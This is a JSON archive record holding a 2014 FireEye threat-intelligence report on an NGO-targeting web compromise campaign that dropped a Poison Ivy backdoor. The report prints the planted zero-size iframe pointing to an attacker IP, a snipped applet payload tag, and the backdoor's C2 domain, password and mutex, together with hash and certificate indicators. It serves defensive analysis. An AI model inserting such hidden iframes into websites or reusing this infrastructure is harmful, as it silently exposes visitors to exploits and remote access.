{
    "id": "377f3eff-2a94-456e-aee2-8625200f1fa7",
    "created_at": "2022-10-25T16:48:23.694993Z",
    "updated_at": "2025-03-27T02:08:40.593403Z",
    "deleted_at": null,
    "sha1_hash": "83adcb352168b2d345155cf4ec7bbc876bb89849",
    "title": "Aided Frame, Aided Direction (Because It's A Redirect)",
    "authors": "FireEye",
    "file_creation_date": "2014-10-17T15:08:07Z",
    "file_modification_date": "2014-10-17T15:08:07Z",
    "file_size": 60406,
    "plain_text": "**Introduction:**\n\nOn September 24 2014, FireEye observed a new strategic web compromise (SWC) campaign that we\n\nbelieve is targeting non-profit organizations and non-governmental organizations (NGO) by hosting\n\niframes on legitimate websites. The compromised websites contained an iframe to direct site visitors to a\n\nthreat actor-controlled IP address that dropped a Poison Ivy remote access tool (RAT) onto victims’\n\nsystems. FireEye has not yet attributed this activity though we have identified links to the Sunshop Digital\n\nQuartermaster, a collective of malware authors that supports multiple China-based advanced persistent\n\nthreat (APT) groups. FireEye previously established detection measures for this threat activity, ensuring\n\nour clients were prepared for these intrusion attempts well in advance of threat actor implementation.\n\n**Activity Overview:**\n\nOn September 24, FireEye observed SWCs, likely conducted by a unitary threat group based on shared\n\ninfrastructure and tools, on at least three different websites: an international non-profit organization that\n\nfocuses on environmental advocacy, and two different NGOs that promote democracy and human rights.\n\nThe group was able to compromise these websites and insert malicious iframes. Figure 1 displays one of\n\nthe iframes. The threat group obfuscated the iframe on two of the compromised websites.\n\n<div class=”views-field views-field-body”>    <div class=”fieldcontent”><p><iframe height=”0″\nsrc=”http://103.27.108.45/img/js.php” width=”0″></iframe></p>\n\n**Figure 1: The iframe that directed website visitors to a threat actor-controlled IP address**\n\nThe iframes on these websites directed visitors to Java exploits hosted at 103.27.108.45. In turn, these\n\nexploits downloaded and decoded a payload hosted at: hxxp://103.27.108.45/img/js.php. A GET request\n\nto this URI returned the following content:\n\n<applet code=”NvTest.class”,height=”200″ width=”200″>\n\n.<param name=”bin” value=’4D5A90……’\n\n**Figure 2: The encoded payload (snipped for brevity)**\n\nThe ‘bin’ param shown in Figure 2 is decoded from ASCII into hex by the Java exploit. Once decoded,\n\nFireEye identified the payload as a Poison Ivy variant. It had the following properties:\n\nMD5         118fa558a6b5020b078739ef7bdac3a1\n\n\n-----\n\nCompile Time     2014 09 15 08:21:23\n\nImport Hash     09d0478591d4f788cb3e5ea416c25237\n\nThe Poison Ivy variant was also code signed with the below certificate:\n\nSHA1           47:8C:E3:D6:CC:17:60:D3:27:14:6A:36:C9:88:77:4D:27:83:6A:D4\n\nMD5            82B582589D4A59BE0720F088ACAC67A3\n\nSerial Number       581AE6B6ABAFD73AC85B1AEFBDB2555F\n\nCommon Name        zilliontek Co.,Ltd\n\nOrganization       zilliontek Co.,Ltd\n\nCountry          KR\n\nState/Province      Gyeonggi-do\n\nCity           Suwon-si\n\nIssue Date        Jan 12 00:00:00 2013 GMT\n\nExpiration Date      Feb 20 23:59:59 2015 GMT\n\nThe backdoor also contained the below versioning info embedded in the RT_VERSION of one of the PE\n\nresources:\n\nLegalCopyright: Copyright 2012 Google Inc. All rights reserved.\n\nInternalName: chrome_exe\n\nProcuctShortName: Chrome\n\nFileVersion: 34.0.1847.131\n\nCompanyName: Google Inc.\n\nOrginaLFilename: chrome.exe\n\nLegalTrademarks:\n\nProductName: Google Chrome\n\nComparyShortName: Google\n\nLastChange: 265687\n\nFileDescription: Google Chrome\n\nOffcial Build: 1\n\n\n-----\n\nTranslation: 0×0409 0x04b0\n\nThis versioning info attempted to masquerade as a Google Chrome file. However, the malware author\n\nmisspelled multiple words when attempting to put in versioning information for this particular build.\n\nThe Poison Ivy implant had the following configuration properties:\n\nC2: quakegoogle.servequake.com, Port: 80\n\nPassword: qeTGd3485fF\n\nMutex: )!VoqA.I4\n\nThe C2 domain quakegoogle.servequake[.]com resolved to 115.126.62.100 at the time of the SWCs. Other\n\ndomains resolving to the same IP include the following:\n\nassign.ddnsking.com\n\nquakegoogle.servequake.com\n\npicsgoogle.servepics.com\n\n**Figure 3: Domains observed resolving to 115.126.62.100**\n\nBetween August 30, 2014 and September 16, 2014 we also observed SOGU (aka Kaba) callback traffic sent\n\nto assign.ddnsking.com over port 443.\n\n**Links to the Sunshop Digital Quartermaster**\n\nThe Poison Ivy backdoor also had a RT_MANIFEST PE resource with a SHA256 fingerprint of\n\n82a98c88d3dd57a6ebc0fe7167a86875ed52ebddc6374ad640407efec01b1393.\n\nThis same RT_MANIFEST resource was documented in our previous Sunshop Digital Quartermaster\n\nreport. FireEye previously identified this specific RT_MANIFEST as the ‘Sunshop Manifest,’ and we have\n\nobserved this same manifest resource used in 86 other samples. As we stated in the Quartermaster report,\n\nwe believe this shared resource is an artifact of a builder toolkit made available to a number of China\nbased APT groups.\n\n**Conclusion**\n\nThis activity represents a new SWC campaign. We suspect threat actors are leveraging their access to\n\ncompromised websites belonging to NGOs and non-profits to target other organizations in the same\n\nindustries. These websites are often visited by organization employees and other organizations in the same\n\nindustries, allowing threat actors to move laterally within already compromised networks or gain access to\n\nnew networks. While FireEye has not attributed this activity to a specific threat group, we frequently\n\n\n-----\n\nactivity within their borders that may lead to domestic unrest or embarrass the Chinese government. For\n\nexample, in 2013, FireEye observed China-based threat actors steal grant applications and activity reports\n\nspecifically related to an international NGO’s China-based activities. We suspects threat actors sought to\n\nmonitor these programs and involved individuals. The three organizations whose websites are hosting the\n\nmalicious iframes have China-based operations.\n\nFireEye is releasing information on this campaign to allow organizations to investigate and prepare for\n\nthis activity in their networks. We believe non-profits and NGOs remain at elevated risk of intrusion and\n\nshould be especially wary of attempts to compromise their networks using SWC. Threat actors may use\n\nSWCs to achieve this goal, but FireEye does not discount the possibility that threat actors will use other\n\nmeans at their disposal, including phishing. Based on past threat actor activity in this industry, FireEye\n\nexpects threat actors are motivated to steal programmatic data and monitor organizations’ programs in\n\nspecific countries. If China-based threat actors are behind the observed campaign, FireEye expects that\n\norganizations with operations in China are high-priority targets. FireEye currently has detection measures\n\nin place that should allow users of FireEye products to detect this SWC activity. It is also likely that other\n\nindustries or organizations were affected by this SWC activity, since these sites are public facing and\n\nfrequently visited.\n\nSpecial thanks to Google’s Billy Leonard for providing additional information and research.\n\nThanks to the following authors for their contributions: Mike Oppenheim, Ned Moran, and Steve Stone.\n\n[This entry was posted in Threat Intelligence, Threat Research by Sarah Engle and Ben Withnell.](http://www.fireeye.com/blog/category/technical/threat-intelligence)\n\n[Bookmark the permalink.](http://www.fireeye.com/blog/technical/2014/09/aided-frame-aided-direction-because-its-a-redirect.html)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/c0vmfv396d3lej8g37mxbhjgbjen1m21",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2014/2014.09.26.Aided_Frame_Aided_Direction/Aided_Frame_Aided_Direction.pdf"
    ],
    "report_names": [
        "Aided_Frame_Aided_Direction"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1413558487,
    "ts_modification_date": 1413558487,
    "files": {
        "pdf": "https://archive.orkl.eu/83adcb352168b2d345155cf4ec7bbc876bb89849.pdf",
        "text": "https://archive.orkl.eu/83adcb352168b2d345155cf4ec7bbc876bb89849.txt",
        "img": "https://archive.orkl.eu/83adcb352168b2d345155cf4ec7bbc876bb89849.jpg"
    }
}